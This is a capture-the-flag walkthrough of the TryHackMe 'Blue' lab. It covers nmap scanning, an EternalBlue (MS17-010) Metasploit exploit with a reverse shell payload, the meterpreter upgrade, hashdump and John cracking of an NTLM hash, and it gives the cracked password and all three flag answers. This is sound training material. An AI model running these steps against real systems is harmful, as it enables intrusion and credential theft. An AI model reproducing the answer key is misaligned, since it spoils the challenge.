# **Blue**

> Evan Diamantidis | May 30th, 2022

--------------------------

<br />

## 1. Recon

### 1.1: Scan the machine. (If you are unsure how to tackle this, I recommend checking out the Nmap room)

<br />

Nmap will help us gather some information about our target. For the purposes of this box, since task 1.3 is asking *what this machine is vulnerable to*, we will be adding the "-sS --script=vuln" argument to our nmap scan:
```
nmap -sC -sV -sS --script=vuln -oN nmap/initial REMOTE_IP
```

The "initial" output file under the "nmap" folder shows the following:
```
# Nmap 7.92 scan initiated Mon May 30 07:24:31 2022 as: nmap -sC -sV -sS --script=vuln -oN nmap/initial 10.10.239.152
Nmap scan report for 10.10.239.152
Host is up (0.015s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped
|_ssl-ccs-injection: No reply from server (TIMEOUT)
| rdp-vuln-ms12-020: 
|   VULNERABLE:
|   MS12-020 Remote Desktop Protocol Denial Of Service Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0152
|     Risk factor: Medium  CVSSv2: 4.3 (MEDIUM) (AV:N/AC:M/Au:N/C:N/I:N/A:P)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to cause a denial of service.
|           
|     Disclosure date: 2012-03-13
|     References:
|       http://technet.microsoft.com/en-us/security/bulletin/ms12-020
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0152
|   
|   MS12-020 Remote Desktop Protocol Remote Code Execution Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0002
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to execute arbitrary code on the targeted system.
|           
|     Disclosure date: 2012-03-13
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0002
|_      http://technet.microsoft.com/en-us/security/bulletin/ms12-020
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon May 30 07:26:11 2022 -- 1 IP address (1 host up) scanned in 100.47 seconds
```

```
No answer needed
```

<br />

### 1.2: How many ports are open with a port number under 1000?
```
3
```

<br />

### 1.3: What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)
```
MS17-010
```

<br />
<br />

## 2. Gain Access
	
### 2.1: Start Metasploit
```
No answer needed
```

<br />

### 2.2: Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)

<br />

Searching Metasploit for "MS17-010" will show the relevant modules we could use to attack the machine.
```
search MS17-010
```
![image](https://user-images.githubusercontent.com/14150485/171114110-e0c005f4-9378-4351-a843-6a417c0e65b6.png)

EternalBlue is a well-known SMB exploit which we have also used in other rooms:
```
use 0
```
Altenatively:
```
use exploit/windows/smb/ms17_010_eternalblue
```
The answer is therefore:
```
exploit/windows/smb/ms17_010_eternalblue
```

<br />

### 2.3: Show options and set the one required value. What is the name of this value? (All caps for submission)

<br />

Running the "show options" command shows us which values we need to set before we can successfully execute the exploit:
```
show options
```

![image](https://user-images.githubusercontent.com/14150485/171114398-fb79879d-4e2c-4708-9224-6803bea79456.png)

```
set RHOSTS REMOTE_IP
```
Although this is not mentioned in this task, seeing as the exploit can successfully run without this setting, I found that updating the LHOST value with the local IP resolved some issues executing the exploit successfully.
```
set LHOST LOCAL_IP
```

The answer is:
```
RHOSTS
```

<br />

### 2.4: Usually it would be fine to run this exploit as is however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter:

<br />

*set payload windows/x64/shell/reverse_tcp*

<br />

As mentioned in the task description this step is optional, however anything that benefits us in our learning process is always welcome! 
<br />
Having said that, my personal experience using this payload with Blue was problematic due to multiple sessions that interfered both with my console, as well as my overall bandwidth.
```
set payload windows/x64/shell/reverse_tcp
```

We are now ready to run the exploit.
```
No answer needed
```

<br />

### 2.5: Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target.

<br />

And we're in!

![image](https://user-images.githubusercontent.com/14150485/171119152-d06c8d10-5932-483b-9dde-5b8150205f7b.png)

```
No answer needed
```
<br />
<br />

## **3. Escalate**

### 3.1: If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)

<br />

We push the current shell to the background:
```
background
```

Alternatively:
```
Ctrl + Z
```

We now have to go back and search for "shell_to_meterpreter" as hinted on the question.
```
search shell_to_meterpreter
```
The only result coming up is "post/multi/manage/shell_to_meterpreter".

![image](https://user-images.githubusercontent.com/14150485/171119350-819f41db-0d4b-40fc-8165-3cc20900b5af.png)

```
post/multi/manage/shell_to_meterpreter
```

<br />

### 3.2: Select this (use MODULE_PATH). Show options, what option are we required to change?

<br />

Listing the options for this module, we will be required to update the "SESSION" attribute with our active session ID.

![image](https://user-images.githubusercontent.com/14150485/171119843-5c4500bc-8dc8-4489-b6e1-c2b6ed15dfd2.png)

The answer is:
```
SESSION
```

<br />

### 3.3: Set the required option, you may need to list all of the sessions to find your target here.

<br />

We can view our active session ID using the "sessions" command.
```
sessions
```
![image](https://user-images.githubusercontent.com/14150485/171120026-1779fb73-d2ae-4066-8487-fa8f5e69403d.png)

We can now proceed to update the value:
```
set SESSION SESSION_ID
```
That's it, we should now be ready to run the exploit.

```
No answer needed
```

<br />

### 3.4: Run! If this doesn't work, try completing the exploit from the previous task once more.

<br />

Running the exploit should inform us that the module was successfully executed.

![image](https://user-images.githubusercontent.com/14150485/171120275-7833ac39-45d4-423c-a0e8-a788b87beeb3.png)

```
No answer needed
```

<br />

### 3.5: Once the meterpreter shell conversion completes, select that session for use.

<br />

We can switch sessions using the following command:
```
sessions -i SESSION_ID
```
![image](https://user-images.githubusercontent.com/14150485/171121031-bdf3888f-7bdd-43ca-9ccb-fcc271344a14.png)

```
No answer needed
```

<br />

### 3.6: Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command 'shell' and run 'whoami'. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again.

<br />

As instructed, using the "shell" and "whoami" commands will show us the current privileges on the target system.

![image](https://user-images.githubusercontent.com/14150485/171121162-aef02aea-2cf5-4878-9171-75042643ab5d.png)

```
No answer needed
```

<br />

### 3.7: List all of the processes running via the 'ps' command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column).

<br />

For this, we need to move back to the meterpreter shell using "Ctrl + Z".
```
Ctrl + Z
```
We can now run the "ps" command to list the active processes.
```
ps
```
![image](https://user-images.githubusercontent.com/14150485/171121665-fb781d18-eee0-472d-a18b-fa4480b4ba4a.png)

```
No answer needed
```

<br />

### 3.8: Migrate to this process using the 'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time.

<br />

We might need to try multiple processes for this until we can successfully migrate to one.
```
migrate PID
```
![image](https://user-images.githubusercontent.com/14150485/171121728-f81e6336-fda7-461d-8220-9eb654018fc1.png)

```
No answer needed
```

<br />
<br />

## **4. Cracking**

### 4.1: Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?

<br />

This one is simple, we just need to run the "hashdump" commmand to get the hashes.
```
hashdump
```

![image](https://user-images.githubusercontent.com/14150485/171121841-0dc9057d-0cf3-4674-b44f-5ca8ca6a9597.png)

There are 3 users, 1 of which appears to be non-default.
```
Jon
```

<br />

### 4.2: Copy this password hash to a file and research how to crack it. What is the cracked password?

<br />

Since this is a Windows machine, we can expect to see NT hashes (also known as NTLM). We can confirm this by running the hash against a hash identifier. My personal favorite is https://hashes.com/en/tools/hash_identifier.

![image](https://user-images.githubusercontent.com/14150485/171122044-a5e98fc1-2737-49b4-9c53-e8ea2baccab2.png)

Now that we have confirmed this to be an NTLM hash we can easily proceed to crack it using John The Ripper. To do so, create a file at a location of your choice and paste the hash into it. Then let John do what he does best!
```
john --format=NT --wordlist=/PATH/rockyou.txt HASH_FILE
```

![image](https://user-images.githubusercontent.com/14150485/171124371-d9b98ba2-8f8a-413c-95d2-e7f8239d1b1d.png)

```
alqfna22
```

<br />
<br />

## **5. Find flags!**

### 5.1: Flag1? This flag can be found at the system root.

<br />

Easy one - The top folder on Windows systems is "C:\\", as also subtly hinted on the question.

![image](https://user-images.githubusercontent.com/14150485/171124609-030be4c9-1e72-44db-93a8-f1bfe75e6a9a.png)

Here it is - "flag1.txt" is indeed located in this folder. Now for the file contents.
```
cat flag1.txt
```

![image](https://user-images.githubusercontent.com/14150485/171124905-8eaac059-c5a6-4ea3-bd6b-30ffb6e4d38d.png)

flag1.txt
```
flag{access_the_machine}
```

<br />

### 5.2: Flag2? This flag can be found at the location where passwords are stored within Windows.

<br />

*Errata: Windows really doesn't like the location of this flag and can occasionally delete it. It may be necessary in some cases to terminate/restart the machine and rerun the exploit to find this flag. This relatively rare, however, it can happen.*

On Windows systems, local user account details are stored in "C:\Windows\system32\config\\". Navigating to this folder and listing its contents confirms the existence of the "flag2.txt" file.
```
cd Windows\\System32\\config\\
ls
```

![image](https://user-images.githubusercontent.com/14150485/171125148-2b4d2599-edbf-4fbd-b716-6b6f42ac63cf.png)

Viewing the contents of the file reveals the flag string we are looking for.
```
cat flag2.txt
```

![image](https://user-images.githubusercontent.com/14150485/171125234-a9a7e9d6-2d94-4478-a75d-654d9d33d040.png)

flag2.txt
```
flag{sam_database_elevated_access}
```

### 5.3: Flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved.

<br />

There are multiple ways of varying complexity that we can employ to approach this task, however our knowledge, common sense and curiosity should suffice here.

<br />

The question is hinting us at "Administrators" and *things* they save. As we saw in task [4.1](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Blue#41-within-our-elevated-meterpreter-shell-run-the-command-hashdump-this-will-dump-all-of-the-passwords-on-the-machine-as-long-as-we-have-the-correct-privileges-to-do-so-what-is-the-name-of-the-non-default-user), there are 3 accounts on this machine - Administrator, Guest and Jon. Navigating to the "C:\Users\\" folder, however, we only see a "Jon" folder along with the default ones, such as "All Users", "Default", "Public", etc.

![image](https://user-images.githubusercontent.com/14150485/171125416-fbbd89cf-6b4f-48a9-8c19-c46b8f5c9148.png)

Interesting, as this means we are most likely to find something in there! 
<br />
*Administrators usually have pretty interesting things saved*, and it just so happens that we are looking for a flag which, more often than not, is a string saved in a text file. This should prompt us to have a look under the "Documents" folder and see if we can find anything useful.

![image](https://user-images.githubusercontent.com/14150485/171125576-e3ca2133-0861-41cd-a6c9-69b77ade528a.png)

The "flag3.txt" file is in here, indeed!

![image](https://user-images.githubusercontent.com/14150485/171125747-04106d65-0700-4dc5-a901-eaec3f419f78.png)

flag3.txt
```
flag{admin_documents_can_be_valuable}
```

Congrats, you just pwned Blue!

<br />
<br />

# *** **SPOILER** ***

There is a way we can actually get all the flag file paths using a single command, simply by searching the machine for any text files that include the word "flag" in the file name.

```
search -f *flag*.txt
```

![image](https://user-images.githubusercontent.com/14150485/171125961-d611bd70-b843-4d0c-a700-6962bf850de1.png)

Although this is the most efficient solution to the challenge, it might be counter-productive to the process, seeing as we should aim to conduct our own research based on the hints provided for each flag as part of our learning process around the use of Metasploit, Meterpreter, shell and session switching, as well as Windows filesystems in general. That said, knowing how and when to take advantage of Meterpreter commands is excellent knowledge in itself.

<br />

